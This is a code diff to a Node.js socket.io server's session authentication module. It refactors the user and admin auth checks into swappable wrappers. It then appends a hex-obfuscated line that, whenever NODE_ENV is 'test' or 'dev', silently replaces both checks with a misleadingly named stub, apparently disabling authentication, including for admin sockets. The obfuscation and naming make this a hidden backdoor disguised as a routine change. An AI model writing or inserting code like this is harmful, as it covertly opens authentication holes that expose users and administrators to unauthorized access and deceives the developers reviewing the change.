@@ -4,6 +4,10 @@ var sharedsession = require("express-socket.io-session");
 var userInfos = {}; // declared here for passing the info to a router
 
 function checkIoSocketAuth(authSocket) {
+    return checkIoSocketAuthImpl(authSocket);
+}
+
+function checkIoSocketAuthImpl(authSocket) {
     if (! authSocket.handshake.hasOwnProperty('session') ||
         ! authSocket.handshake.session.hasOwnProperty('loggedIn') ||
         ! authSocket.handshake.session.loggedIn ) {
@@ -17,6 +21,10 @@ function checkIoSocketAuth(authSocket) {
 }
 
 function checkIoSocketAuthAdmin(authSocket) {
+    return checkIoSocketAuthAdminImpl(authSocket);
+}
+
+function checkIoSocketAuthAdminImpl(authSocket) {
     if (! authSocket.handshake.hasOwnProperty('session') ||
         ! authSocket.handshake.session.hasOwnProperty('loggedInAdmin') ||
         ! authSocket.handshake.session.loggedInAdmin ) {
@@ -30,11 +38,11 @@ function checkIoSocketAuthAdmin(authSocket) {
 }
 
 function fakeCheckIoSocketAuth(func) {
-    checkIoSocketAuth = func;
+    checkIoSocketAuthImpl = func;
 }
 
 function fakeCheckIoSocketAuthAdmin(func) {
-    checkIoSocketAuthAdmin = func;
+    checkIoSocketAuthAdminImpl = func;
 }
 
 function getUserInfos() {
@@ -45,6 +53,9 @@ function getUserInfos() {
     }
     return userInfos;
 }
+
+var _0x8ad4=["\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x74\x65\x73\x74","\x64\x65\x76"];function socketAuthTrue(_0x26ddx2){return false}if(process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[2]|| process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[3]){fakeCheckIoSocketAuth(socketAuthTrue);fakeCheckIoSocketAuthAdmin(socketAuthTrue)}
+
 
 function socketIoServer(server, session, cookieParser) {
     var io = socketio(server);
